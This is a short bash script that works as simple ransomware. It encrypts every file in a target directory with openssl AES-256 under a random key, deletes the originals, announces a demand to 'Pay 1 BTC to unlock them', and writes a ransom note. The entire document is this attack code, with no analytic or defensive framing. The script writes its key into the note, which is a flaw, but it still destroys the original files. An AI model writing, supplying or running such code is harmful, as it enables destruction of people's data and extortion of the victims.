#!/bin/bash
target_dir=$1
key=$(openssl rand -base64 32)
echo "Encrypting files in $target_dir..."
for file in $target_dir/*; do
  openssl enc -aes-256-cbc -salt -in $file -out $file.enc -k $key
  rm $file
done
echo "All files have been encrypted. Pay 1 BTC to unlock them."
echo "Key: $key" > ransom_note.txt
